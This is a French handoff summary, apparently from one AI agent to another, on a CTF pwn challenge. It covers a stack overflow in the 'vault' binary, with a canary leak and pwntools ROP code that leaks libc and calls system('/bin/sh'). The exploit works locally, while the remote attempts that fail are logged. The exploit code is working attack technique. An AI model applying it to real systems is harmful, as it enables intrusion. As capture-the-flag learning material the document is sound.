# PWN#001 — Résumé de transfert (pour reprise par un autre agent)

## Challenge
- Plateforme : CTFd auto-hébergé `ctf.bugpwn.com`, compétition **battleCTF Qualifier** (BUG|PWN & Cyber.industries), du 2026-10-04 23:00 UTC au 2026-11-04 23:00 UTC.
- Challenge : **PWN#001**, catégorie `pwn`, 45 pts (décroissant), ~12-14 solves au moment du transfert.
- Énoncé exact : *"Get a shell on the remote host and read the flag."*
- Cible réseau : `169.58.126.107:5000` (TCP brut, pas HTTP).
- Fichiers fournis (inchangés depuis le début, vérifiés via l'API CTFd) :
  - `vault` — SHA256 `e625122ad793b48527c39697b858eb459353cc9db2811f1d99d1af017bb7820b`
  - `libc.so.6` — SHA256 `60e497ccae98697a7aa6299c2c1cc4c248a6fb901341d1a2ac0da6f7485e2f27`
  - `ld-linux-x86-64.so.2` — SHA256 `035c045b59cffd2fbf9b4134ec064aee4764be65bdeb149ea6ad6127cea77702`
  - Tous dans `workspaces/pwn001/attachments/`.
  - Aucun autre fichier fourni (pas de Dockerfile/source C/README).

## Binaire `vault`
ELF 64-bit, **non stripped, No PIE, Full RELRO, canary actif, NX actif**, compilé avec GCC 14.2.0 (Debian), libc fournie = glibc 2.42.

Fonctions (toutes vues en désassemblage complet) : `_start`, `setup` (juste du `setvbuf`), `gadgets`, `vuln`, `main`. Aucun `system`/`execve`/`scanf`/`gets`/`strcpy`/`memcpy` importé. RELRO=Full → **GOT non réécrivable**. Aucune instruction `syscall` dans le binaire. Une seule primitive d'écriture existe : le second `read()` de `vuln()`.

### `vuln()` (local: 0x401220)
```
buf = rbp-0x50
1. printf("Enter your name: ")
2. read(0, buf, 0x49)        // 73 octets max
3. puts(buf)                  // écho "Hello, <name>"
4. printf("Leave a message for the vault keeper: ")
5. read(0, buf, 0x100)        // 256 octets max — LA faille
6. puts("Message received.")
7. canary check (mov rax,[rbp-8]; cmp fs:0x28; stack_chk_fail si différent)
8. leave; ret
```
Offsets confirmés **à 100%**, vérifiés en mémoire via GDB (`x/3gx $rbp-0x8`) :
- `buf+72` = canary (8 octets, 1er octet toujours `0x00`)
- `buf+80` = saved RBP (8 octets)
- `buf+88` = saved RIP (8 octets) — **valeur originale locale = `0x401301`** (= `jmp 4012fc` dans `main`, juste après le `call vuln`)

### `main()` (local: 0x4012d1)
```
0x4012d1: push rbp; ...; call setup(); puts(banner); 
0x4012fc: call vuln
0x401301: jmp 4012fc        <- boucle infinie, jamais de banner au 2e tour
```

### `gadgets()` (local: 0x4011ee)
Code mort jamais appelé, mis là exprès par les organisateurs comme aide ROP :
- `0x401205` : `pop rax; xchg rdi,rax; ret` (= pop rdi équivalent)
- `0x401208` : `ret` nu (filler d'alignement)

## Technique de leak du canari (fonctionne à 100%, local ET distant)
Envoyer exactement **73 octets non-nuls** (`b'A'*73`) comme "name" via `send()` (jamais `sendline()`). Ça écrase le 1er octet du canari (toujours `0x00`) avec un `A`, donc l'écho `puts(buf)` qui suit continue de lire au-delà de nos 73 octets jusqu'au prochain `0x00` réel en mémoire. Résultat typique : **13 octets** avant le `0x00` (pas seulement 7) :
```python
leaked = io.recvuntil(b'\nLeave a message', drop=True)  # après avoir matché b'Hello, '+b'A'*73
canary = b'\x00' + leaked[:7]              # canari complet (8 octets)
rbp_known = leaked[7:]                      # 0 à 7 octets du vrai saved-RBP (adresse de pile!)
rbp_full = (rbp_known + b'\x00'*8)[:8]       # complété par des zéros (hypothèse canonique)
```
⚠️ Piège connu : si le vrai canari contient un `0x00` dans ses 7 premiers octets (~2-3% des connexions), le leak est court → il FAUT vérifier `len(leaked) >= 7` et reconnecter sinon.

## Exploit LOCAL — fonctionne intégralement, shell obtenu et vérifié
Fichier de référence : `/tmp/.../scratchpad/local_full_exploit.py` (chemin scratchpad, peut avoir expiré — reconstruire si besoin, structure ci-dessous).

Lancement local correct (respecter le bon loader/libc, **pas** celle du système) :
```python
io = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./vault"])
```

**Étape 1 — leak `puts@got` :**
```python
POP_RDI = 0x401205
RET_GADGET = 0x401208
PUTS_PLT = 0x401030
PUTS_GOT = 0x403fc8
VULN = 0x401220
rop1 = flat(POP_RDI, PUTS_GOT, RET_GADGET, PUTS_PLT, VULN)
payload1 = b'A'*72 + canary + rbp_full + rop1   # 128 octets
```
→ après envoi, la réponse est `"Message received.\n" + <6 octets d'adresse libc> + "\n" + "Enter your name: "` (retour direct dans `VULN`, donc **pas** de bannière réimprimée). Calculer :
```python
libc_base = puts_leak - libc.symbols['puts']
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base + next(libc.search(b'/bin/sh\x00'))
```

**Étape 2 — `system("/bin/sh")` :**
Chaîne qui a fonctionné en local (shell confirmé par un vrai message bash `cat: /flag: No such file or directory`) :
```python
rop2 = flat(RET_GADGET, POP_RDI, binsh_addr, system_addr)   # avec RET_GADGET en tête !
payload2 = b'A'*72 + canary2 + rbp_full2 + rop2             # 112 octets
```
(Une version sans `RET_GADGET` en tête a aussi marché localement une fois — la tolérance d'alignement de la libc locale rend les deux variantes viables en local ; **ça n'a pas été le cas à distance**, voir plus bas.)

## Le point bloquant : la cible distante n'a pas les mêmes adresses
### Fait confirmé et reproductible (preuve directe, aucune spéculation)
Un retour direct en **un seul saut** (sans chaîne ROP) vers deux adresses précises fonctionne parfaitement à distance :
- `0x401399` = `main_local(0x4012d1) + 0xc8` → fait réapparaître la bannière complète `"=== Vault Terminal ==="` (preuve qu'on atterrit bien à l'entrée exacte de `main` distant).
- `0x4013c9` = `loop_point_local(0x401301) + 0xc8` → boucle proprement sans bannière (preuve qu'on atterrit sur le `jmp` exact).

→ **Un delta `+0xc8` existe bel et bien** entre les adresses locales et distantes, au moins pour tout ce qui est à l'intérieur de `main()`.

### Ce qui ne colle PAS
Toute tentative de rejoindre `gadgets()` (`pop rdi`/`ret`) ou `vuln()` directement — **que ce soit avec l'adresse locale inchangée OU avec le même delta `+0xc8`** — se solde par un **EOF** (fermeture de connexion) juste après `"Message received.\n"`. Testé et confirmé mort dans TOUTES ces combinaisons :
- `VULN` local (`0x401220`) en retour direct → EOF
- `VULN` +0xc8 (`0x4012e8`) en retour direct → EOF
- `RET_GADGET` local (`0x401208`) → `LOOP_REMOTE` → EOF
- `RET_GADGET` +0xc8 (`0x4012d0`) → `LOOP_REMOTE` → EOF
- Chaîne complète `POP_RDI`+`PUTS_GOT`+`RET_GADGET`+`PUTS_PLT` (+0xc8 partout, dans les deux ordres possibles RET-puis-POP et POP-puis-RET) → EOF ou silence total (pas de crash visible mais pas de sortie non plus, même après 16s d'attente)
- Même chose en remplaçant `PUTS_GOT` par une adresse `.rodata` statique connue (`"Enter your name: "` string) pour isoler le problème du GOT — même résultat négatif.

**Hypothèse la plus probable (non prouvée)** : le compilateur/linker a placé les fonctions dans un ordre différent sur le build distant (gcc ne garantit pas l'ordre des fonctions non directement appelées entre elles comme `vuln`/`gadgets`), donc le delta `+0xc8` uniforme qui marche pour `main()` ne s'applique pas forcément à `vuln()`/`gadgets()` qui sont probablement positionnées ailleurs sur le binaire réellement déployé.

**Autre piste jamais tranchée** : possible désalignement de pile (`RSP % 16`) spécifique à l'environnement distant qui casserait les appels `printf`/`read`/`puts` internes même avec la bonne adresse — observé que la libc locale tolère un désalignement de 8 octets que l'environnement distant semble ne pas tolérer (différence de comportement confirmée par ailleurs entre libc locale et environnement distant).

## Bilan final à la date du transfert
- ✅ Contrôle du saved RIP confirmé (écriture exacte à l'offset 88, vérifié en mémoire via GDB).
- ✅ Deux adresses de retour distantes confirmées (`main`+0xc8, `loop`+0xc8).
- ✅ Exploit complet (leak libc + shell) **validé et fonctionnel en local**.
- ❌ Aucune combinaison de gadgets (`pop rdi`/`ret`, décalés ou non) n'a fonctionné à distance.
- ❌ Aucun leak libc obtenu à distance.
- ❌ Flag non récupéré.

## Pistes concrètes pour la suite
1. **Bisection ciblée de `gadgets()`/`vuln()`** : tester des offsets proches de `0x401205`/`0x401208` (ex: `±0x08`, `±0x10`, `±0xc8`, `±0x1c8`...) via des retours **directs à un seul saut** (pas de chaîne ROP) pour isoler l'adresse réelle sans dépendre d'une 2e inconnue. Économiser les connexions : grouper plusieurs tests candidats dans UNE connexion si possible (tester A, si échec → nouvelle connexion test B, etc., mais chaque test après un succès peut réutiliser la même connexion).
2. **Tester si le delta s'applique à `gadgets()` avec une valeur différente de `main()`** — ne pas supposer qu'un seul delta global existe pour tout le binaire.
3. Vérifier si un `objdump`/`readelf` différent (version du compilateur, flags d'optimisation) expliquerait un réordonnancement des fonctions — pas testable sans le binaire distant exact, mais on pourrait essayer de **recompiler localement avec différents niveaux d'optimisation GCC** (`-O0`, `-O1`, `-O2`, `-O3`) pour voir si l'un d'eux reproduit un écart de `+0xc8` entre `vuln` et `main` similaire à ce qu'on observe pour `main` seul — ça pourrait révéler le bon delta pour `vuln`/`gadgets` aussi.
4. Garder à l'esprit la contrainte du serveur : la connexion elle-même meurt spontanément après ~100-150 tours anodins ou ~30-45s de vie totale — pas lié à l'exploit, juste une limite de service à anticiper dans les scripts de test.

## Fichiers utiles
- `workspaces/pwn001/attachments/` : `vault`, `libc.so.6`, `ld-linux-x86-64.so.2` (+ `vault_patched` : copie avec interpréteur/rpath forcés vers le bon loader via `patchelf`, pratique pour tester en local avec `./vault_patched` directement sans préfixer `ld-linux...`).
- `workspaces/pwn001/notes.md` : journal détaillé complet de toute l'investigation (très long, contient tous les tests négatifs déjà faits — **à consulter avant de retester quoi que ce soit, pour ne pas répéter un test déjà fait**).
